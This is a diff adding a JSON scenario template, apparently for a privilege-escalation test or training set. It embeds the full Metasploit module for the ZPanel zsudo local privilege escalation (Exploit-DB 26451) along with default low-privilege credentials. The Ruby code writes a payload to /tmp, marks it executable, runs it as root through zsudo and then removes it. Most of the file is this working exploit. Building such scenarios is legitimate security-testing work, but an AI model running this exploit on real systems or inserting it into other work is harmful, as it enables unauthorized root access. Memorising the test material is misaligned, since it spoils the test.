@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_26451",
+  "category": "A2_sudo",
+  "attack_technique": "T1548.003",
+  "cwe": "CWE-269",
+  "description": "Linux privilege escalation: ZPanel zsudo - Local Privilege Escalation (Metasploit) (OSVDB-92582)\n\nExploit source code (26451.rb):\n```\n##\n# This file is part of the Metasploit Framework and may be subject to\n# redistribution and commercial restrictions. Please see the Metasploit\n# web site for more information on licensing and terms of use.\n#   http://metasploit.com/\n##\n\nrequire 'msf/core'\nrequire 'rex'\nrequire 'msf/core/post/common'\nrequire 'msf/core/post/file'\nrequire 'msf/core/post/linux/priv'\nrequire 'msf/core/exploit/exe'\n\n\nclass Metasploit4 < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Post::File\n  include Msf::Post::Common\n\n  def initialize(info={})\n    super( update_info( info, {\n        'Name'          => 'ZPanel zsudo Local Privilege Escalation Exploit',\n        'Description'   => %q{\n          This module abuses the zsudo binary, installed with zpanel, to escalate\n          privileges. In order to work, a session with access to zsudo on the sudoers\n          configuration is needed. This module is useful for post exploitation of ZPanel\n          vulnerabilities, where typically web server privileges are acquired, and this\n          user is allowed to execute zsudo on the sudoers file.\n        },\n        'License'       => MSF_LICENSE,\n        'Author'        => [ 'sinn3r', 'juan vazquez' ],\n        'DisclosureDate' => 'Jun 07 2013',\n        'Platform'      => [ 'unix', 'linux'],\n        'Arch'          => [ ARCH_CMD, ARCH_X86 ],\n        'SessionTypes'  => [ 'shell', 'meterpreter' ],\n        'Targets'       =>\n          [\n            [ 'Command payload', { 'Arch' => ARCH_CMD } ],\n            [ 'Linux x86',       { 'Arch' => ARCH_X86 } ]\n          ],\n        'DefaultOptions' => { \"PrependSetresuid\" => true, \"WfsDelay\" => 2 },\n        'DefaultTarget' => 0,\n      }\n      ))\n    register_options([\n        # These are not OptPath becuase it's a *remote* path\n        OptString.new(\"WritableDir\", [ true, \"A directory where we can write files\", \"/tmp\" ]),\n        OptString.new(\"zsudo\",        [ true, \"Path to zsudo executable\", \"/etc/zpanel/panel/bin/zsudo\" ]),\n      ], self.class)\n  end\n\n  def check\n    if file?(datastore[\"zsudo\"])\n      return CheckCode::Detected\n    end\n\n    return CheckCode::Unknown\n  end\n\n  def exploit\n    if (target.arch.include? ARCH_CMD)\n      exe_file = \"#{datastore[\"WritableDir\"]}/#{rand_text_alpha(3 + rand(5))}.sh\"\n      # Using this way of writing the payload to avoid issues when failing to find\n      # a command on the victim for writing binary data\n      cmd_exec \"echo \\\"#{payload.encoded.gsub(/\"/, \"\\\\\\\"\")}\\\" > #{exe_file}\"\n    else\n      exe_file = \"#{datastore[\"WritableDir\"]}/#{rand_text_alpha(3 + rand(5))}.elf\"\n      write_file(exe_file, generate_payload_exe)\n    end\n\n    cmd_exec \"chmod +x #{exe_file}\"\n\n    print_status(\"Running...\")\n\n    begin\n      cmd_exec \"#{datastore[\"zsudo\"]} #{exe_file} #{rand_text_alpha(3 + rand(5))}\"\n    ensure\n      cmd_exec \"rm -f #{exe_file}\"\n    end\n\n  end\nend\n```",
+  "cve": "OSVDB-92582",
+  "exploitdb_id": "26451",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_26451",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
